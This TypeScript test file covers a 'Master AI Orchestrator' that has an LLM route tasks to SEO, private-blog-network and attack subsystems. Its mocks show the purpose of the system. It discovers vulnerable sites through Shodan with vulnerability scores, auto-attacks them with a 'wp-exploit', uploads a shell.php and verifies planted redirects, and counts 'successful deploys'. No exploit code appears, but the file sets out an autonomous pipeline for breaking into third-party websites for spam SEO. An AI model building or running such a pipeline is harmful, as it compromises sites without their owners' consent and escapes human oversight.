import { describe, expect, it, vi, beforeEach } from "vitest";

/**
 * Tests for the Master AI Orchestrator system.
 * We test the orchestrator router procedures and core logic.
 */

// Mock the database
const mockDb = {
  select: vi.fn().mockReturnThis(),
  from: vi.fn().mockReturnThis(),
  where: vi.fn().mockReturnThis(),
  orderBy: vi.fn().mockReturnThis(),
  limit: vi.fn().mockReturnThis(),
  insert: vi.fn().mockReturnThis(),
  update: vi.fn().mockReturnThis(),
  set: vi.fn().mockReturnThis(),
  values: vi.fn().mockResolvedValue([{ insertId: 1 }]),
  execute: vi.fn().mockResolvedValue([]),
};

vi.mock("./db", () => ({
  getDb: vi.fn().mockResolvedValue(mockDb),
}));

vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{
      message: {
        content: JSON.stringify({
          analysis: "System is healthy. All subsystems operational.",
          priorities: ["seo", "rank"],
          recommendations: ["Run daily SEO tasks", "Check rank changes"],
        }),
      },
    }],
  }),
}));

vi.mock("./telegram-notifier", () => ({
  sendTelegramNotification: vi.fn().mockResolvedValue({ success: true }),
}));

vi.mock("./seo-daily-engine", () => ({
  runDailyAutomation: vi.fn().mockResolvedValue({
    projectId: 1,
    domain: "test.com",
    date: "2026-03-09",
    plan: { tasks: [] },
    executions: [],
    summary: { total: 5, completed: 4, failed: 1, skipped: 0, totalDuration: 5000 },
    aiSummary: "Daily tasks completed",
  }),
}));

vi.mock("./seo-agent", () => ({
  runAllProjectsDailyTasks: vi.fn().mockResolvedValue({
    projectsProcessed: 2,
    totalTasks: 10,
    totalCompleted: 8,
    totalFailed: 2,
  }),
}));

vi.mock("./ai-autonomous-engine", () => ({
  runAiCommander: vi.fn().mockResolvedValue({
    success: true,
    iterations: 3,
    successfulMethod: "wp-exploit",
    uploadedUrl: "https://target.com/shell.php",
    redirectVerified: true,
    decisions: [],
    executionResults: [],
    reconData: null,
    totalDurationMs: 15000,
    historyInsights: null,
    nonWpExploitResults: null,
  }),
}));

vi.mock("./mass-target-discovery", () => ({
  runMassDiscovery: vi.fn().mockResolvedValue({
    id: "disc-1",
    startedAt: Date.now(),
    completedAt: Date.now(),
    status: "completed",
    totalQueriesRun: 5,
    totalRawResults: 100,
    totalAfterDedup: 80,
    totalAfterFilter: 30,
  }),
}));

vi.mock("./auto-pipeline", () => ({
  runAutoPipeline: vi.fn().mockResolvedValue({
    id: "pipe-1",
    startedAt: Date.now(),
    phase: "discovery",
    nonWpResults: [],
    attackDeployIds: [],
    attackResults: [],
    stats: { totalTargets: 50, attacked: 0, successful: 0, failed: 0 },
    events: [],
    config: {},
  }),
}));

vi.mock("./scan-scheduler", () => ({
  runScanNow: vi.fn().mockResolvedValue(undefined),
  startScanScheduler: vi.fn(),
  stopScanScheduler: vi.fn(),
}));

// ─── Test: Orchestrator State Management ───
describe("Orchestrator State Management", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should create orchestrator state if none exists", async () => {
    // Mock: no existing state
    mockDb.limit.mockResolvedValueOnce([]);
    // Mock: after insert, return new state
    mockDb.limit.mockResolvedValueOnce([{
      id: 1,
      status: "stopped",
      currentCycle: 0,
      totalCycles: 0,
      cycleIntervalMinutes: 30,
      maxConcurrentTasks: 5,
      maxDailyActions: 1000,
      todayActions: 0,
      totalDecisions: 0,
      totalTasksCompleted: 0,
      lastCycleAt: null,
      nextCycleAt: null,
      aiWorldState: null,
      aiPriorities: null,
      createdAt: new Date(),
      updatedAt: new Date(),
    }]);

    const { getOrCreateOrchestratorState } = await import("./master-orchestrator");
    const state = await getOrCreateOrchestratorState();
    
    expect(state).toBeDefined();
    expect(state.status).toBe("stopped");
    expect(state.currentCycle).toBe(0);
  });

  it("should return existing state if one exists", async () => {
    const existingState = {
      id: 1,
      status: "running",
      currentCycle: 5,
      totalCycles: 5,
      cycleIntervalMinutes: 30,
      maxConcurrentTasks: 5,
      maxDailyActions: 1000,
      todayActions: 15,
      totalDecisions: 25,
      totalTasksCompleted: 50,
      lastCycleAt: new Date(),
      nextCycleAt: new Date(),
      aiWorldState: null,
      aiPriorities: null,
      createdAt: new Date(),
      updatedAt: new Date(),
    };
    
    mockDb.limit.mockResolvedValueOnce([existingState]);

    const { getOrCreateOrchestratorState } = await import("./master-orchestrator");
    const state = await getOrCreateOrchestratorState();
    
    expect(state).toBeDefined();
    expect(state.status).toBe("running");
    expect(state.currentCycle).toBe(5);
    expect(state.todayActions).toBe(15);
  });
});

// ─── Test: Orchestrator Running State ───
describe("Orchestrator Running State", () => {
  it("should report running state correctly", async () => {
    const { isOrchestratorRunning } = await import("./master-orchestrator");
    // Initially not running (no interval set)
    expect(typeof isOrchestratorRunning()).toBe("boolean");
  });
});

// ─── Test: Task Routing ───
describe("Task Executor Routing", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should route SEO tasks to seo-daily-engine", async () => {
    const { runDailyAutomation } = await import("./seo-daily-engine");
    
    // Simulate calling the SEO engine directly
    const report = await runDailyAutomation(1);
    
    expect(report).toBeDefined();
    expect(report.summary.total).toBe(5);
    expect(report.summary.completed).toBe(4);
    expect(runDailyAutomation).toHaveBeenCalledWith(1);
  });

  it("should route attack tasks to ai-autonomous-engine", async () => {
    const { runAiCommander } = await import("./ai-autonomous-engine");
    
    const result = await runAiCommander({
      targetDomain: "test.com",
      redirectUrl: "https://redirect.com",
      maxIterations: 5,
      pipelineType: "autonomous",
    });
    
    expect(result).toBeDefined();
    expect(result.success).toBe(true);
    expect(result.iterations).toBe(3);
    expect(result.successfulMethod).toBe("wp-exploit");
  });

  it("should route discovery tasks to mass-target-discovery", async () => {
    const { runMassDiscovery } = await import("./mass-target-discovery");
    
    const result = await runMassDiscovery({
      useShodan: true,
      useSerpApi: true,
      minVulnScore: 30,
      maxTargets: 100,
    });
    
    expect(result).toBeDefined();
    expect(result.status).toBe("completed");
    expect(result.totalRawResults).toBe(100);
    expect(result.totalAfterFilter).toBe(30);
  });

  it("should route all-projects SEO tasks to seo-agent", async () => {
    const { runAllProjectsDailyTasks } = await import("./seo-agent");
    
    const result = await runAllProjectsDailyTasks();
    
    expect(result).toBeDefined();
    expect(result.projectsProcessed).toBe(2);
    expect(result.totalCompleted).toBe(8);
  });

  it("should route auto-pipeline tasks correctly", async () => {
    const { runAutoPipeline } = await import("./auto-pipeline");
    
    const run = await runAutoPipeline({
      discovery: { useShodan: true, useSerpApi: true, minVulnScore: 30, maxTargets: 50 },
      autoAttack: true,
      maxConcurrentAttacks: 3,
      attackOnlyAboveScore: 50,
      skipWaf: false,
      runNonWpScan: true,
      notifyTelegram: true,
    });
    
    expect(run).toBeDefined();
    expect(run.id).toBe("pipe-1");
    expect(run.phase).toBe("discovery");
  });
});

// ─── Test: Orchestrator Decision Types ───
describe("Orchestrator Decision Validation", () => {
  it("should validate decision structure", () => {
    const validDecision = {
      subsystem: "seo",
      action: "Run daily SEO automation",
      reasoning: "Projects need daily optimization",
      confidence: 85,
      tasks: [
        {
          taskType: "seo_daily_automation",
          subsystem: "seo",
          title: "Run daily SEO for project 1",
          projectId: 1,
          priority: "medium" as const,
        },
      ],
    };

    expect(validDecision.subsystem).toBe("seo");
    expect(validDecision.confidence).toBeGreaterThanOrEqual(0);
    expect(validDecision.confidence).toBeLessThanOrEqual(100);
    expect(validDecision.tasks).toHaveLength(1);
    expect(validDecision.tasks[0].priority).toMatch(/^(critical|high|medium|low)$/);
  });

  it("should validate all subsystem types", () => {
    const validSubsystems = ["seo", "attack", "discovery", "pbn", "rank", "autobid"];
    
    validSubsystems.forEach(subsystem => {
      expect(typeof subsystem).toBe("string");
      expect(subsystem.length).toBeGreaterThan(0);
    });
  });

  it("should validate priority levels", () => {
    const validPriorities = ["critical", "high", "medium", "low"];
    
    validPriorities.forEach(priority => {
      expect(["critical", "high", "medium", "low"]).toContain(priority);
    });
  });
});

// ─── Test: World State Structure ───
describe("World State Structure", () => {
  it("should have correct shape for SEO state", () => {
    const seoState = {
      totalProjects: 5,
      activeProjects: 3,
      projectsNeedingAttention: [],
      recentRankChanges: [],
      contentPending: 10,
      backlinksBuiltToday: 5,
    };

    expect(seoState.totalProjects).toBeGreaterThanOrEqual(0);
    expect(seoState.activeProjects).toBeLessThanOrEqual(seoState.totalProjects);
    expect(Array.isArray(seoState.projectsNeedingAttention)).toBe(true);
    expect(Array.isArray(seoState.recentRankChanges)).toBe(true);
  });

  it("should have correct shape for Attack state", () => {
    const attackState = {
      totalDeploys: 100,
      successfulDeploys: 75,
      failedDeploys: 25,
      recentDeploys: [],
      activePipelines: 2,
    };

    expect(attackState.successfulDeploys + attackState.failedDeploys).toBeLessThanOrEqual(attackState.totalDeploys);
    expect(attackState.activePipelines).toBeGreaterThanOrEqual(0);
  });
});
